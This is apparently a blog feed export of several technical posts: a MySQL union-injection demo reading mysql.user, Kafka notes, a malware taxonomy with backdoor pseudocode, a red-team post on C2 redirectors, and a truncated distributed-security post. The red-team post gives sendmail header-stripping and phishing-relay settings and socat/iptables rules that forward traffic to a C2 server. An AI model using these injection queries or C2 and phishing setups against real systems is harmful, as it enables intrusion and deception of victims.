|</span><br><span class="line">+--------------------+--------------------+----------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>读取host与user</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id =1 union select 1,host,user from mysql.user;</span><br><span class="line">+----+-----------+----------+</span><br><span class="line">| id | username  | password |</span><br><span class="line">+----+-----------+----------+</span><br><span class="line">|  1 | Dumb      | Dumb     |</span><br><span class="line">|  1 | %         | root     |</span><br><span class="line">|  1 | 127.0.0.1 | root     |</span><br><span class="line">|  1 | ::1       | root     |</span><br><span class="line">|  1 | localhost | root     |</span><br><span class="line">+----+-----------+----------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>消息队列中间件</title>
      <link href="/josyaaa/2022/05/11/kafka/"/>
      <url>/josyaaa/2022/05/11/kafka/</url>
      
        <content type="html"><![CDATA[<h1 id="kafka-events"><a href="#kafka-events" class="headerlink" title="kafka events"></a>kafka events</h1><ul><li>internet of things</li><li>user interaction</li><li>and so on</li></ul><p><strong>“kafka events &#x3D; Notification + State”(key and value)</strong></p><h1 id="序列化-and-反序列化"><a href="#序列化-and-反序列化" class="headerlink" title="序列化 and 反序列化"></a>序列化 and 反序列化</h1><ul><li>序列化格式：JSON&#x2F;JSON_Schema&#x2F;Avro&#x2F;Protobuf …</li><li>序列化对象值：应用程序或对象的表示或者某种东西的信息</li><li>kafka keys：系统中某个实体的状态</li></ul><h2 id="topic"><a href="#topic" class="headerlink" title="topic"></a>topic</h2><ul><li>topic is named container for similar events</li><li>durable logs of events</li><li>events are immutable</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">logs 是 kafka 作为基础组件使用的核心</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="分区（partitioning）"><a href="#分区（partitioning）" class="headerlink" title="分区（partitioning）"></a>分区（partitioning）</h2><ul><li>topic 为完全存在一台机器上，作为集群的一个结点</li><li>partitioning 采用单个主题日志，将日志划分为多个主题（将topic分解），如果 topic 拥有 value 通过散列函数 输出模块的 partitioning 要写入分区号</li></ul><h2 id="brokers-经纪人"><a href="#brokers-经纪人" class="headerlink" title="brokers (经纪人)"></a>brokers (经纪人)</h2><ul><li>an computer, instance,or container,runing the kafka process</li><li>Manage partitions</li><li>Handle write and read requests</li><li>Manage replication of partitions</li></ul><h2 id="replication"><a href="#replication" class="headerlink" title="replication"></a>replication</h2><ul><li>copies of data for fault tolerance</li><li>one load partition and N-1 followers</li><li>In general,writes and reads happen to the leader</li><li>An invisible process to most developers</li><li>Yunable in the Producer</li></ul><h2 id="Producer"><a href="#Producer" class="headerlink" title="Producer"></a>Producer</h2><ul><li>管理连接池</li><li>进行网络缓冲</li><li>等待代理确认消息</li><li>释放缓冲区空间</li><li>容错的重新传输消息</li></ul><p><strong>轮询无密钥、没有密钥、散列密钥来计算目标分区、自定义配置方案</strong></p><h2 id="consumer"><a href="#consumer" class="headerlink" title="consumer"></a>consumer</h2><ul><li>阅读消息不会破坏kafka，仍然可供使用</li><li>扩展消费者，提供任意数量的消费者之间的交付订单的能力</li></ul><h2 id="connect"><a href="#connect" class="headerlink" title="connect"></a>connect</h2><ul><li>其他系统要进入kafka topic，kafka topic 进入其他系统，这是kafka connect work</li><li>connect &#x3D; output + input</li><li>生产为源连接器，消费为同步连接器</li></ul><h2 id="schema-Registry"><a href="#schema-Registry" class="headerlink" title="schema Registry"></a>schema Registry</h2><ul><li>schema Registry 是一个独立的服务器进程，运行在kafka代理之外的机器上，负责维护写入其负责的集群中主题的所有模式的数据库，在冗余的高可用性配置中运行模式注册表。</li><li>schema Registry 是 API ， 允许生产者和消费者预测</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">调用REST接口</span><br><span class="line"></span><br><span class="line">supported Formats : JSON_Schema/Avro/Protocol Buffers (change IDL , end write AVSC docs)</span><br></pre></td></tr></table></figure><h2 id="kafka-stream"><a href="#kafka-stream" class="headerlink" title="kafka stream"></a>kafka stream</h2><ul><li><p>消费者越来越复杂，很快就会变成复杂的聚合和丰富的各种疯狂的事情。由于 consumer API 没有支持所有需要大量代码去构建框架来处理TimeWindows、迟到的消息、乱序消息、查找表、按键聚合等。</p></li><li><p>聚合等操作是有状态的，可意味着是一个在程序堆中分配的内存其实是个容错任务（设计部署一个内存数据网格并且可以高效的放入和取出）所以kafka stream的作用</p></li><li><p>kafka stream 像消费者群体就是一个消费者组。可以自动进行横向扩展在此基础上建立并解决诸多有意思的问题</p></li></ul><h2 id="KsqlDB"><a href="#KsqlDB" class="headerlink" title="KsqlDB"></a>KsqlDB</h2><ul><li>A database optimized for stream processing</li><li>runs on its own scalable,fault-tolerant cluster adhacent to the kafka cluster</li><li>stream processing programs written in SQL</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">command line interface</span><br><span class="line"></span><br><span class="line">REST API for application intergration</span><br><span class="line"></span><br><span class="line">Java library</span><br><span class="line"></span><br><span class="line">kafka connect intergration</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>KsqlDB 旨在提供一个易于使用且熟悉的界面，为大多数基于kafka的流处理应用程序工作负载，提供一个单一的思维模型</strong></p><h2 id="消息队列项目"><a href="#消息队列项目" class="headerlink" title="消息队列项目"></a>消息队列项目</h2><ul><li>kafka</li></ul><p>kafka 某种形式上的消息队列数据库</p><ul><li>pulsar</li></ul><p>pulsar 是一个云原生的分布式消息传递和流媒体平台，最主要的特点就是存储分离，pulsar 更像是连接的消息管道，bookkeeper 作为持久消息存储，因为这就有点像 database，可以形成存储分分布式集群，当然可以叫做持久消息存储。对了 pulsar 的多租户，支持隔离，认证，授权，隔离和配额，这个很有意思的事情是，身份认证的策略，puslar 用了这种“套接字形式”去保证消息管道的安全性，这个或许有点用，但是仍然需要好的身份验证策略，类似于 eBPF 中 cilium 这种项目的策略会很 nice.题外话，pulsar 代码越来越多，越来越重，看着有点繁 。</p><ul><li>rocketmq</li></ul><p>rocketmq 是一个分布式消息和流媒体平台，具有低延迟、高性能、可靠性、万亿级容量和灵活的扩展性。这个就不太像说点啥了，阿里内部跑出来的消息，有大量的数据量考验，不过云原生方面有点落后了</p><ul><li>redpanda</li></ul><p>redpanda 是一个用于关键工作负载的流媒体平台，兼容kafka，不需zk（去zk是个趋势，需要大数据项目都在去zk，尤其是hadoop生态区逐渐弱化，大数据体系变得更加 open），无需 JVM，最终要的 Wasm 技术&#x2F;地理复制分层存储的流传输并且是 C++ 编写，这个很让我惊喜因为一直以为大数据只能 Java，但是发现越来越多的大数据用其他语言编写，C++ 但是出来的东西很偏向 “01010101” 上的大数据内层发展。</p><h2 id="消息队列常见应用场景"><a href="#消息队列常见应用场景" class="headerlink" title="消息队列常见应用场景"></a>消息队列常见应用场景</h2><h3 id="异步处理"><a href="#异步处理" class="headerlink" title="异步处理"></a>异步处理</h3><p><strong>案例：</strong>邮件注册，串行或并行</p><ol><li>串行也就是说“一个一个来做”</li><li>并行也就是说“全部同时来做”</li></ol><p>（并发量、吞吐量、响应时间）会有局限，也就是可以引入异步处理，即弱化不必要的业务逻辑，改为异步逻辑结构</p><h3 id="应用解耦"><a href="#应用解耦" class="headerlink" title="应用解耦"></a>应用解耦</h3><p><strong>案例：</strong>支付消息通知存储，调用其接口</p><ol><li>当无法访问时，可能会存在耦合</li></ol><p>（消息队列可作为‘中间人’，一端完成持久化处理，另一端采用拉&#x2F;推的方式）</p><h3 id="流量削锋"><a href="#流量削锋" class="headerlink" title="流量削锋"></a>流量削锋</h3><p><strong>案例：</strong>流量峰值过大，防止应用挂掉</p><ol><li>控制活动人数，缓解短时间的高流量，用户请求服务器接收后，首先写入消息队列</li></ol><h3 id="日志处理"><a href="#日志处理" class="headerlink" title="日志处理"></a>日志处理</h3><p><strong>案例：</strong>将消息队列用在日志处理中</p><ol><li>日志采集客户端，负责日志数据采集，定时写入消息–&gt; 负责日志数据接收、存储和转发–&gt;日志处理应用–&gt;订阅并消费队列中的日志数据</li></ol><h5 id="消息流程"><a href="#消息流程" class="headerlink" title="消息流程"></a>消息流程</h5><ul><li>接收消息队列 –&gt; 日志解析（logstash） –&gt; 实时日志分析（elasticsearch） –&gt; 消息可视化（kibana）</li></ul><h3 id="聊天通讯"><a href="#聊天通讯" class="headerlink" title="聊天通讯"></a>聊天通讯</h3><p><strong>案例：</strong>点对点以及发布订阅模式</p><h2 id="JVM-常见内容"><a href="#JVM-常见内容" class="headerlink" title="JVM  常见内容"></a>JVM  常见内容</h2><ul><li><p><a href="https://docs.oracle.com/javase/specs/jvms/se7/html/jvms-1.html">JVM规范</a></p></li><li><p><a href="https://www.credera.com/insights/modern-data-architecture-an-overview-of-lambda-and-kappa-architectures">数仓架构</a>，<a href="https://techcommunity.microsoft.com/t5/azure-global/azure-data-architecture-guide-blog-4-hybrid-data-architecture/ba-p/306579">混合数据架构</a></p></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>恶意软件逻辑框架</title>
      <link href="/josyaaa/2022/05/11/malware_01/"/>
      <url>/josyaaa/2022/05/11/malware_01/</url>
      
        <content type="html"><![CDATA[<h3 id="Trojan-Horse"><a href="#Trojan-Horse" class="headerlink" title="Trojan Horse:"></a>Trojan Horse:</h3><p>There was no love lost between the Greeks and the Trojans. The Greeks had<br>besieged the Trojans, holed up in the city of Troy, for ten years. They finally<br>took the city by using a clever ploy: the Greeks built an enormous wooden horse,<br>concealing soldiers inside, and tricked the Trojans into bringing the horse into<br>Troy. When night fell, the soldiers exited the horse and much unpleasantness<br>ensued.</p><p>In computing, a Trojan horse is a program which purports to do some benign<br>task, but secretly performs some additional malicious task. A classic example is<br>a password-grabbing login program which prints authentic-looking “username”<br>and “password” prompts, and waits for a user to type in the information. When<br>this happens, the password grabber stashes the information away for its creator,<br>then prints out an “invalid password” message before running the real login<br>program. The unsuspecting user thinks they made a typing mistake and reenters<br>the information, none the wiser.</p><h3 id="Logic-Bomb"><a href="#Logic-Bomb" class="headerlink" title="Logic Bomb:"></a>Logic Bomb:</h3><p>The oldest type of malicious software.  This program is embedded with some other program.  When certain condition meets, the logic bomb will destroy your pc.<br>It also crash at particular date which is fixed by attacer.  It will be included in legitimate or authorized person like this:</p><h3 id="Back-Door-or-Trap-Door"><a href="#Back-Door-or-Trap-Door" class="headerlink" title="Back Door or Trap Door:"></a>Back Door or Trap Door:</h3><p>A back door is any mechanism which bypasses a normal security check. Programmers<br>sometimes create back doors for legitimate reasons, such as skipping<br>a time-consuming authentication process when debugging a network server.<br>As with logic bombs, back doors can be placed into legitimate code or be<br>standalone programs.</p><blockquote></blockquote><p>username &#x3D; read_username()<br>password &#x3D; read_password()<br>if tisername i s “133t h4ck0r”:<br>return ALLOW^LOGIN<br>if username and password are valid:<br>return ALLOW_LOGIN<br>e l s e:<br>return DENY^LOGIN</p><p>One special kind of back door is a RAT, which stands for Remote Administration<br>Tool or Remote Access Trojan, depending on who’s asked. These programs<br>allow a computer to be monitored and controlled remotely;</p><blockquote></blockquote><p>Virus:<br>Self-replicating: yes<br>Population growth: positive<br>Parasitic: yes</p><p>A virus is malware that, when executed, tries to replicate itself into other executable<br>code; when it succeeds, the code is said to be infected. The infected<br>code, when run, can infect new code in turn. This self-replication into existing<br>executable code is the key defining characteristic of a virus.<br>Types of Virus</p><blockquote></blockquote><p>1.Parasitic virus:<br>   Traditional and common virus.  This will be attached with EXE files and search for other EXE file to infect them.<br>2. Memory Resident Virus:<br>    Present in your system memory as a system program.  From here onwards it will infects all program that executes.<br>3. Boot Sector Virus:<br>     Infects the boot record and spread when the system is booted from the disk containing the virus.<br>4. Stealth Virus:<br>     This virus hides itself from detection of antivirus scanning.</p><h3 id="Worm"><a href="#Worm" class="headerlink" title="Worm:"></a>Worm:</h3><p>A worm shares several characteristics with a virus. The most important characteristic<br>is that worms are self-replicating too, but self-replication of a worm<br>is distinct in two ways. First, worms are standalone, and do not rely on other<br>executable code. Second, worms spread from machine to machine across networks.</p><h3 id="Rabbit"><a href="#Rabbit" class="headerlink" title="Rabbit:"></a>Rabbit:</h3><p>Rabbit is the term used to describe malware that multiplies rapidly. Rabbits<br>may also be called bacteria, for largely the same reason.</p><p>There are actually two kinds of rabbit.The first is a program which tries<br>to consume all of some system resource, like disk space. A “fork bomb,” a<br>program which creates new processes in an infinite loop, is a classic example<br>of this kind of rabbit. These tend to leave painfully obvious trails pointing to<br>the perpetrator, and are not of particular interest.</p><p>The second kind of rabbit, which the characteristics above describe, is a<br>special case of a worm. This kind of rabbit is a standalone program which<br>replicates itself across a network from machine to machine, but deletes the<br>original copy of itself after replication. In other words, there is only one copy<br>of a given rabbit on a network; it just hops from one computer to another.<br>Rabbits are rarely seen in practice.</p><h3 id="Spyware"><a href="#Spyware" class="headerlink" title="Spyware:"></a>Spyware:</h3><p>Spyware is software which collects information from a computer and transmits<br>it to someone else.</p><blockquote></blockquote><p>The exact information spyware gathers may vary, but can include anything<br>which potentially has value:<br>1 Usernames and passwords. These might be harvested from files on the<br>machine, or by recording what the user types using a key logger. A keylogger<br>differs from a Trojan horse in that a keylogger passively captures keystrokes<br>only; no active deception is involved.<br>2 Email addresses, which would have value to a spammer.<br>3 Bank account and credit card numbers.<br>4 Software license keys, to facilitate software pirating.</p><h3 id="Adware"><a href="#Adware" class="headerlink" title="Adware:"></a>Adware:</h3><p>Adware has similarities to spyware in that both are gathering information about<br>the user and their habits. Adware is more marketing-focused, and may pop up<br>advertisements or redirect a user’s web browser to certain web sites in the hopes<br>of making a sale. Some adware will attempt to target the advertisement to fit<br>the context of what the user is doing. For example, a search for “Calgary” may<br>result in an unsolicited pop-up advertisement for “books about Calgary.”<br>Adware may also gather and transmit information about users which can be<br>used for marketing purposes. As with spyware, adware does not self-replicate.</p><h3 id="Zombies"><a href="#Zombies" class="headerlink" title="Zombies:"></a>Zombies:</h3><p>Computers that have been compromised can be used by an attacker for a<br>variety of tasks, unbeknownst to the legitimate owner; computers used in this<br>way are called zombies. The most common tasks for zombies are sending spam<br>and participating in coordinated, large-scale denial-of-service attacks.</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p><strong>传染机制：</strong>病毒、木马、蠕虫</p><p><strong>有效载荷：</strong>系统损坏、僵尸程序、网络钓鱼、间谍软件、rootkit</p><h3 id="malware-package"><a href="#malware-package" class="headerlink" title="malware package"></a>malware package</h3><p><em><strong>高级持续威胁：商业性荷政治性目标、使用多种入侵技术和恶意软件，并在很长一段时间内发起持续有效的攻击的网络犯罪</strong></em></p><p><em><strong>adware 广告软件：集成在软件中的广告程序，能够产生弹出式广告或将浏览器重定向到某个商业网站</strong></em></p><p><em><strong>attack kit 攻击工具包：通过使用各种传播和载荷机制自动生成新恶意软件的工具</strong></em></p><p><em><strong>auto rooter：用于远程入侵新的机器上的恶意攻击工具</strong></em></p><p><em><strong>后门：能够绕过正常安全检查的任何机制，可以允许未经授权访问某些功能</strong></em></p><p><em><strong>下载器 downloads：被攻击机器上安装其他内容的程序，通常下载器是包含在恶意代码中的，该恶意代码首先被安装在被感染系统中，而后下载大量的恶意软件</strong></em></p><p><em><strong>路过式下载 drive-by-downloads：利用受感染网站的攻击方式，当该网站被访问时，被植入其中的恶意代码以利用浏览器漏洞攻击访问者所在系统</strong></em></p><p><em><strong>漏洞应用攻击程序 exploit：针对某个或多个漏洞进行攻击的代码</strong></em></p><p><em><strong>洪泛攻击 dos：通过向联网的计算机系统发送大量数据包而实现DDOS的程序</strong></em></p><p><em><strong>键盘记录器 keylogger：捕获受控系统中键盘输入的程序</strong></em></p><p><em><strong>逻辑炸弹：被入侵者插到正常软件中的程序。当预定义的条件满足时，逻辑炸弹被触发，开始执行非授权的操作，其他时间处于休眠状态</strong></em>        </p><p><em><strong>宏病毒：一种使用宏语言或脚本编写的可以通常被植入一个文档中，当该文档被浏览器或编辑时触发，然后复制其他文档</strong></em></p><p><em><strong>移动代码：能够不加修改地移植不同类型的系统平台上按照完全相同的语义执行的软件（脚本、宏或者其他可移植的指令）</strong></em></p><p><em><strong>rootkit：攻击者成功入侵计算机系统并获得root访问权限之后使用攻击工具</strong></em>  </p><p><em><strong>垃圾邮件程序：发送大量垃圾邮件系统</strong></em></p><p><em><strong>间谍软件 spyware：通过监听输入、显示器数据或网络流量、通过搜寻系统中的文件获取敏感信息，并将收集到的信息发送到另一台计算机系统</strong></em></p><p><em><strong>特洛伊木马：一种隐藏工具却有用的代码</strong></em></p><p><em><strong>病毒：在执行时设法将自己复制到其他可执行代码中的恶意代码</strong></em></p><p><em><strong>蠕虫：能够独立执行并且可以将自己完整的可执行版本传播到网络中其他主机上的计算机程序，通常通过攻击目标系统中软件漏洞或使用捕获授权凭证来实现</strong></em></p><p><em><strong>僵尸机 zombie&#x2F;bot：在被感染计算机中运行，激活后向其他计算机发送攻击的程序</strong></em></p><h3 id="malware-classification"><a href="#malware-classification" class="headerlink" title="malware classification"></a>malware classification</h3><p><a href="https://blog.csdn.net/m0_37442062/article/details/98598086?spm=1001.2101.3001.6650.6&utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-6.pc_relevant_paycolumn_v3&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-6.pc_relevant_paycolumn_v3&utm_relevant_index=11">maybe crimeware list</a></p><h3 id="malware-spread"><a href="#malware-spread" class="headerlink" title="malware spread"></a>malware spread</h3><ul><li>感染机制（infection mechanism）: 病毒传播和进行自我复制方法（infection vector）</li><li>触发条件（trigger）: 激活或交付病毒有效载荷的事件或条件（logic bomb）</li><li>有效载荷（payload）: 病毒除传播之外的活动</li></ul><h3 id="malware-virus-life-cycle"><a href="#malware-virus-life-cycle" class="headerlink" title="malware virus life cycle"></a>malware virus life cycle</h3><ul><li>潜伏阶段 dormant phase</li><li>传播阶段 propagation phase</li><li>触发阶段 triggering phase</li><li>执行阶段 execution phase</li></ul><h3 id="传播-感染内容-病毒"><a href="#传播-感染内容-病毒" class="headerlink" title="传播 - 感染内容 - 病毒"></a>传播 - 感染内容 - 病毒</h3><p>恶意软件是第一种传播类型设计软件片段的寄生，它将自身依附于一些现有可执行内容中（脚本语言代码：Word、Excel、Adobe PDF）</p><p>###（目标）</p><ul><li>感染引导扇区病毒：感染主引导记录或引导记录，当系统从含有这类病毒的磁盘上启动时病毒就开始传播</li><li>感染可以执行文件病毒：感染可以在操作系统或shell中执行文件</li><li>宏病毒：感染含有应用程序解释的可执行宏代码或脚本语言的文件</li><li>多元复合型病毒：多中途径感染文件</li></ul><p>###（隐藏方式）</p><ul><li><p>隐匿型病毒（stealth virus）:这种病毒设计目的就是躲避反病毒软件的检测（通过代码的多态、压缩或则rookit技术实现隐藏）</p></li><li><p>ploymorphic virus ： 防止其他程序检测到，一种在自我复制时生成功能相同但位排列方式完全不同的拷贝病毒，多态病毒可能随机插入冗余指令或交换独立指令的顺序，更为有效的方法是使用加密。<br>加密病毒策略：病毒代码中负责生成密钥和执行加密｜解密的部分称为变形引擎（mutation engine）</p></li><li><p>metamorphic virus ： 不同的是变形病毒在每次变异中都重写病毒体，因此增加病毒检测的难度。</p></li></ul><h2 id="传播-漏洞利用-蠕虫"><a href="#传播-漏洞利用-蠕虫" class="headerlink" title="传播 - 漏洞利用 - 蠕虫"></a>传播 - 漏洞利用 - 蠕虫</h2><p>恶意软件的另一种传播类型设计软件漏洞利用，而蠕虫是通常会利用这些漏洞</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>红队提供弹性和隐蔽性</title>
      <link href="/josyaaa/2022/05/11/Infrastructure_01/"/>
      <url>/josyaaa/2022/05/11/Infrastructure_01/</url>
      
        <content type="html"><![CDATA[<p>为了进一步提高弹性和隐蔽性，每个后端资产（即团队服务器）都应该在其前面放置一个重定向器。目标是在我们的目标服务器和后端服务器之间始终有一个主机。以这种方式设置基础架构可以更快、更轻松地滚动新的基础架构 - 无需在后端建立新的团队服务器、迁移会话和重新连接未销毁的资产。</p><h3 id="SMTP"><a href="#SMTP" class="headerlink" title="SMTP"></a>SMTP</h3><ul><li>删除以前服务器的标头</li></ul><blockquote><p>Remove previous server headers<br>Add the following line to the end of &#x2F;etc&#x2F;mail&#x2F;sendmail.mc:<br>define(<code>confRECEIVED_HEADER&#39;,</code>by $j ($v&#x2F;$Z)$?r with $r$. id $i; $b’)dnl</p></blockquote><blockquote><p>Add to the end of &#x2F;etc&#x2F;mail&#x2F;access<br>IP-to-Team-Server <em>TAB</em> RELAY<br>Phish-Domain <em>TAB</em> RELAY</p></blockquote><ul><li>配置包罗万象的地址</li></ul><blockquote><p>configure a catch all address<br>echo PHISH-DOMAIN &gt;&gt; &#x2F;etc&#x2F;mail&#x2F;local-host-names<br>FEATURE(<code>virtusertable&#39;, </code>hash -o &#x2F;etc&#x2F;mail&#x2F;virtusertable.db’)dnl<br>@phishdomain.com  external-relay-address</p></blockquote><ul><li>后缀<br>Postfix</li></ul><h3 id="有效载荷"><a href="#有效载荷" class="headerlink" title="有效载荷"></a>有效载荷</h3><ul><li>有效负载</li><li>Web重定向</li></ul><h3 id="网络流量"><a href="#网络流量" class="headerlink" title="网络流量"></a>网络流量</h3><ul><li>修改C2流量</li></ul><h3 id="C2（HTTP-S-、DNS-等）"><a href="#C2（HTTP-S-、DNS-等）" class="headerlink" title="C2（HTTP(S)、DNS 等）"></a>C2（HTTP(S)、DNS 等）</h3><p>使用C2重定向器应在您的后利用框架上配置外部侦听器，以通过重定向器域发送暂存流量</p><p><strong>域名系统</strong></p><ul><li>DNS的socat</li></ul><blockquote><p>socat to 53 to DNS Data package<br>socat udp4-recvfrom:53,reuseaddr,fork udp4-sendto:<IPADDRESS>; echo -ne</p></blockquote><ul><li>DNS的iptables</li></ul><blockquote><p>DNS redirector rule-set is below<br>iptables -I INPUT -p udp -m udp –dport 53 -j ACCEPT<br>iptables -t nat -A PREROUTING -p udp –dport 53 -j DNAT –to-destination <IP-GOES-HERE>:53<br>iptables -t nat -A POSTROUTING -j MASQUERADE<br>iptables -I FORWARD -j ACCEPT<br>iptables -P FORWARD ACCEPT<br>sysctl net.ipv4.ip_forward&#x3D;1</p></blockquote><p><strong>HTTP（S）</strong></p><ul><li>socat</li></ul><blockquote><p>单个网络接口和多个网络接口<br>socat TCP4-LISTEN:80,fork TCP4:<REMOTE-HOST-IP-ADDRESS>:80<br>socat TCP4-LISTEN:80,bind&#x3D;10.0.0.2,fork TCP4:1.2.3.4:80</p></blockquote><ul><li>mode_rewirte</li></ul><blockquote></blockquote><p>iptables -I INPUT -p tcp -m tcp –dport 80 -j ACCEPT<br>iptables -t nat -A PREROUTING -p tcp –dport 80 -j DNAT –to-destination <REMOTE-HOST-IP-ADDRESS>:80<br>iptables -t nat -A POSTROUTING -j MASQUERADE<br>iptables -I FORWARD -j ACCEPT<br>iptables -P FORWARD ACCEPT<br>sysctl net.ipv4.ip_forward&#x3D;1</p><ul><li>HTTP socat</li></ul><blockquote></blockquote><p>cd &#x2F;etc&#x2F;ssh&#x2F;sshd_config<br>vim sshd_config</p><h1 id="Allow-the-SSH-client-to-specify-which-hosts-may-connect"><a href="#Allow-the-SSH-client-to-specify-which-hosts-may-connect" class="headerlink" title="Allow the SSH client to specify which hosts may connect"></a>Allow the SSH client to specify which hosts may connect</h1><p>GatewayPorts yes</p><h1 id="Allow-both-local-and-remote-port-forwards"><a href="#Allow-both-local-and-remote-port-forwards" class="headerlink" title="Allow both local and remote port forwards"></a>Allow both local and remote port forwards</h1><p>AllowTcpForwarding yes</p><ul><li>HTTP iptables</li></ul><blockquote></blockquote><ul><li>HTTP ssh</li></ul><p><strong>C2重定向</strong></p><ul><li>HTTPS C2</li><li>Apache mode_rewirte</li></ul><h2 id="重定向器模型"><a href="#重定向器模型" class="headerlink" title="重定向器模型"></a>重定向器模型</h2><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">A[domain1.com] --&gt;C&#123;Phishing &amp; Payloads&#125;</span><br><span class="line">    C --&gt;|SMTP Server| D[router]</span><br><span class="line">    C --&gt;|Apache Redirector| E[router]</span><br></pre></td></tr></table></figure><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">A[domain2.com] --&gt;B(DNS Redirector)</span><br><span class="line">    B --&gt; C(LT DNS C2)</span><br></pre></td></tr></table></figure><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">A[domain3.com] --&gt;B(DNS Redirector)</span><br><span class="line">    B --&gt; C(LT DNS C2)</span><br></pre></td></tr></table></figure><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">A[domain4.com] --&gt;B(Apache Redirector)</span><br><span class="line">    B --&gt; C(ST HTTP C2)</span><br></pre></td></tr></table></figure><hr><h3 id="域"><a href="#域" class="headerlink" title="域"></a>域</h3><p>开源OSINT可以帮助对控制状态以及检查域的资源做出最佳猜测</p><ul><li>CatMyFish</li><li>DomainHunter</li><li>AIRMASTER</li><li>Chameleon</li><li>DNS传播检查器</li></ul><p>分类和黑名单检查资源</p><ul><li>McAfee</li><li>Fortiguard</li><li>Symantec + BlueCoat</li><li>Checkpoint (requires free account)</li><li>Palo Alto</li><li>Sophos (submission only; no checking) - Click Submit a Sample -&gt; Web Address</li><li>TrendMicro</li><li>Brightcloud</li><li>Websense (Forcepoint)</li><li>Lightspeed Systems</li><li>Chameleon</li><li>SenderBase</li><li>MultiBL</li><li>MXToolBox - Blacklists</li></ul><h3 id="网络钓鱼"><a href="#网络钓鱼" class="headerlink" title="网络钓鱼"></a>网络钓鱼</h3><ul><li>基于Web网络钓鱼</li><li>鱼叉网络钓鱼<blockquote><p>钓鱼框架：<br>Gophish<br>Phishing Frenzy<br>The Social-Engineer Toolkit<br>FiercePhish (formerly FirePhish)</p></blockquote></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>分布式系统 V1.0</title>
      <link href="/josyaaa/2022/05/11/distributed-security/"/>
      <url>/josyaaa/2022/05/11/distributed-security/</url>
      
        <content type="html"><![CDATA[<p>分布式系统安全性可以粗略划分为：<br>1、不同机器上的用户或进程之间的通信，主要是通过安全通道机制，更准确的是身份认知、消息完整性以及机密性的构建策略<br>2、用于确保进程只获得授予它的对分布式系统内资源的访问权限</p><p>其次我在考虑分布式系统安全性范型从自顶向下进行探索性知识实验，了解分布式系统安全性体系结构有助于帮助举一反三的看待诸多开源中间件等具有分布式特性的项目。</p><h1 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h1><h3 id="安全性-1"><a href="#安全性-1" class="headerlink" title="安全性"></a>安全性</h3><p>可靠性包括可用性、可信赖性、安全性、可维护性以及计算机的机密性、完整性</p><ul><li>机密性是可以让系统凭借此属性使得信息只向授权用户公开</li><li>完整性是可以让系统的变更只能以授权的方式进行</li></ul><h3 id="安全威胁"><a href="#安全威胁" class="headerlink" title="安全威胁"></a>安全威胁</h3><p>同时安全性也是我们试图需要保护该系统所提供的服务和数据不受到安全威胁，主要的安全威胁是：<br>1、窃听：未经授权的用户获得一项服务或数据的访问权限<br>2、中断：服务或数据变得难以获取、不能使用、被破坏等情况<br>3、修改：数据未经授权的改变或篡改<br>4、伪造：产生通常不存在附加数据或活动的情况</p><h3 id="安全策略与安全机制"><a href="#安全策略与安全机制" class="headerlink" title="安全策略与安全机制"></a>安全策略与安全机制</h3><ul><li>安全策略：准确地描述系统中的实体（包括用户、机器、服务、数据等）能够采取以及不能采取的行为</li><li>安全机制：加密、身份认证、授权、审计</li></ul><p>1、加密将数据转换为一些攻击不能理解的形式同时加密实现一种实现机密性的方式<br>2、身份认证用于检验用户、客户、服务器等所声明的身份<br>3、用于追踪各个客户的访问内容以及访问方式，虽然审计并不真正提供任何防止安全威胁的保护，但是审计记录对安全破坏的分析以及随后采取措施防止入侵攻击。</p><h1 id="安全体系结构"><a href="#安全体系结构" class="headerlink" title="安全体系结构"></a>安全体系结构</h1><ul><li>用户代理：即为一个进程，系统允许该进程在有限的一段时间内代表用户进行操作</li><li>资源代理：即为在指定域内运行一个进程，用于将一个资源上的全局操作转换为遵循特定网域的安全策略的局部操作</li></ul><p>Globus安全体系结构为例：<br><img src="/josyaaa/.image/1-1.png" alt="1-1"></p><h1 id="分布式安全设计问题"><a href="#分布式安全设计问题" class="headerlink" title="分布式安全设计问题"></a>分布式安全设计问题</h1><h2 id="控制的焦点"><a href="#控制的焦点" class="headerlink" 